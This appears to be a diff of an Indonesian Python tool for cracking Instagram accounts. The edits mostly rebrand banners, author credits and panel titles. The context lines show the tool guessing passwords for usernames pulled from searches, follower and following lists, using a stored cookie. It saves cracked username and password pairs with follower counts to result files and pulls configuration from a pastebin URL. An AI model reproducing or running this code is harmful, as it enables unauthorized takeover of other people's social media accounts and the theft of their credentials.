@@ -255,9 +255,9 @@ def Banner___Gua__Ngab():
 	except:pass
 	prints(Panel(f"""
 
-╦╔═╗   ╔═╗╦═╗╔═╗╔═╗╦╔═   𝙨𝙘𝙧𝙞𝙥𝙩: 𝘽𝘼𝙅𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇
-║║ ╦───║  ╠╦╝╠═╣║  ╠╩╗   𝙜𝙖𝙩𝙖𝙪𝙨𝙞𝙖𝙥𝙖: 𝘽𝘼𝙅𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇
-╩╚═╝   ╚═╝╩╚═╩ ╩╚═╝╩ ╩   𝙜𝙞𝙩𝙝𝙪𝙗: 𝙜𝙞𝙩𝙝𝙪𝙗.𝙘𝙤𝙢/𝙨𝙘-𝙗𝙖𝙟
+╦╔═╗   ╔═╗╦═╗╔═╗╔═╗╦╔═   𝙨𝙘𝙧𝙞𝙥𝙩: 𝘽𝙧𝙖𝙮𝙚𝙣𝙣𝙣𝙓𝘿
+║║ ╦───║  ╠╦╝╠═╣║  ╠╩╗   𝙜𝙖𝙩𝙖𝙪𝙨𝙞𝙖𝙥𝙖: 𝙈4𝘾
+╩╚═╝   ╚═╝╩╚═╩ ╩╚═╝╩ ╩   𝙜𝙞𝙩𝙝𝙪𝙗: 𝙜𝙞𝙩𝙝𝙪𝙗.𝙘𝙤𝙢/𝙙𝙤𝙘𝙡𝙤𝙭𝙚𝙧/𝙈4𝘾
 
 """,subtitle=f"Good Night",title=f"{B2}{waktu()}",width=70,padding=(0,4),style=f"#FFFFFF"))
 
@@ -270,7 +270,7 @@ def loading():
     print("")		
 
 try:
-# python 2
+    # python 2
 	urllib_quote_plus = urllib.quote
 except:
     # python 3
@@ -297,7 +297,7 @@ def cekAPI(cookie):
 
     return external,user
 
-def ggwp17():
+def apzxzsd():
         try:
             kuki=open('data/cookie.txt','r').read()
         except FileNotFoundError:
@@ -487,10 +487,10 @@ class instagram:
 			self.mentod()
 			prints(Panel(f"{H2}{IP}",title=f"{P2}IP",subtitle=f"{P2}{CN}",width=80,padding=(0,30),style=f"#FFFFFF"))
 			prints(Panel(f"""
-{P2}[{R2}01{P2}]. 𝙘𝙧𝙖𝙘𝙠 𝙞𝙙 𝙙𝙖𝙧𝙞 𝙥𝙚𝙣𝙘𝙖𝙧𝙞𝙖𝙣 𝙣𝙖𝙢𝙖   {P2}[{R2}05{P2}]. 𝙘𝙚𝙠 𝙝𝙖𝙨𝙞𝙡 𝙘𝙧𝙖𝙘𝙠
-{P2}[{R2}02{P2}]. 𝙘𝙧𝙖𝙘𝙠 𝙞𝙙 𝙙𝙖𝙧𝙞 𝙥𝙚𝙣𝙜𝙞𝙠𝙪𝙩         {P2}[{R2}06{P2}]. 𝙗𝙤𝙩 𝙖𝙪𝙩𝙤 𝙪𝙣𝙛𝙤𝙡𝙡𝙤𝙬
-{P2}[{R2}03{P2}]. 𝙘𝙧𝙖𝙘𝙠 𝙞𝙙 𝙙𝙖𝙧𝙞 𝙢𝙚𝙣𝙜𝙞𝙠𝙪𝙩𝙞        {P2}[{R2}07{P2}]. 𝙧𝙚𝙢𝙤𝙫𝙚 𝙡𝙞𝙨𝙚𝙣𝙨𝙞
-{P2}[{R2}04{P2}]. 𝙘𝙧𝙖𝙘𝙠 𝙪𝙡𝙖𝙣𝙜 𝙝𝙖𝙨𝙞𝙡 𝙘𝙥           {P2}[{R2}00{P2}]. 𝙠𝙚𝙡𝙪𝙖𝙧 ({M2} hapus cookie {P2})""",title=f"{M2}• {K2}• {H2}•{P2} MENU {H2}• {K2}• {M2}•",width=80,padding=(0,4),style=f"#FFFFFF"))
+{P2}[{R2}01{P2}]. crack id dari pencarian nama   {P2}[{R2}05{P2}]. cek hasil crack
+{P2}[{R2}02{P2}]. crack id dari pengikut         {P2}[{R2}06{P2}]. bot auto unfollow
+{P2}[{R2}03{P2}]. crack id dari mengikuti        {P2}[{R2}07{P2}]. remove lisensi
+{P2}[{R2}04{P2}]. crack ulang hasil cp           {P2}[{R2}00{P2}]. keluar ({M2} hapus cookie {P2})""",title=f"{M2}• {K2}• {H2}•{P2} MENU {H2}• {K2}• {M2}•",width=80,padding=(0,4),style=f"#FFFFFF"))
 
 	def mentod(self):
 	       	for i in external:
@@ -829,7 +829,7 @@ class instagram:
 					pass
 		print('\n')
 		os.popen('play-audio data/sound/message.mp3')
-		prints(Panel(f" {P2}DUTACOLI {R2}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"#FFFFFF"))
+		prints(Panel(f" {P2}VINDRA-XD {R2}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"#FFFFFF"))
 		exit()
 
 	def APIinfo(self,user):
@@ -902,7 +902,7 @@ class instagram:
 							adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {user_agentAPI()}'
 							pepekXD = nel(adit, style='green')
 							print('\n')
-							cetak(nel(pepekXD,style='',title='\r[green]LOGIN DUTA COLI[white]'))
+							cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API[white]'))
 							open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
 							break
@@ -911,7 +911,7 @@ class instagram:
 							adit=f'\rNama      : null\nUsername  : null\nPassword  : null\nPengikut  : null\nMengikuti : null\nPostingan : null\nUser-Agent: {user_agentAPI()}'
 							pepekXD = nel(adit, style='green')
 							print('\n')
-							cetak(nel(pepekXD,style='',title='\r[green]LOGIN DUTA COLI[white]'))
+							cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API[white]'))
 							open(f"result/success-{day}.txt","a").write(f'null|null\n')
 							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
 							break
@@ -921,7 +921,7 @@ class instagram:
 						adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {user_agentAPI()}'
 						pepekXD = nel(adit, style='yellow')
 						print('\n')
-						cetak(nel(pepekXD,style='', title='\r[yellow]CHECK DUTA COLI[white]'))
+						cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method API[white]'))
 						open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 						checkpoint.append(user)
 						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
@@ -992,7 +992,7 @@ class instagram:
 					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uazku()}'
 					pepekXD = nel(adit, style='green')
 					print('\n')
-					cetak(nel(pepekXD,style='',title='\r[green]LOGIN DUTA COLI[white]'))
+					cetak(nel(pepekXD,style='',title='\r[green]Account Login Method API V2[white]'))
 					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 					success.append(user)
 					break
@@ -1002,7 +1002,7 @@ class instagram:
 					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {uazku()}'
 					pepekXD = nel(adit, style='yellow')
 					print('\n')
-					cetak(nel(pepekXD,style='', title='\r[yellow]CHECK DUTA COLI[white]'))
+					cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method API V2[white]'))
 					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 					checkpoint.append(user)
 					break
@@ -1020,7 +1020,7 @@ class instagram:
 		global loop,success,checkpoint
 		ses = requests.Session()
 		uas = random.choice(UaNgentodMuach)
-		sys.stdout.write(f'\r{P}[{H}#{P}] VINDRA-XD {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
+		sys.stdout.write(f'\r{P}[{H}#{P}] ⒹⓄⒸⓁⓄⓀⒺⓇ {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
 		try:
 			for pw in pas:
 				xxcteam = random.randint(1000000000, 99999999999)
@@ -1421,7 +1421,7 @@ if __name__=='__main__':
 	         ki = ses.get('https://pastebin.com/raw/9GybVKaq').json()
 	         HARIS1.update(ki)
 	         os.system("git pull")
-	         ggwp17()
+	         apzxzsd()
 	except requests.exceptions.ConnectionError:
 		print(f'{P}[{M}!{P}] koneksi internet anda bermasalah')
 		time.sleep(0.03)
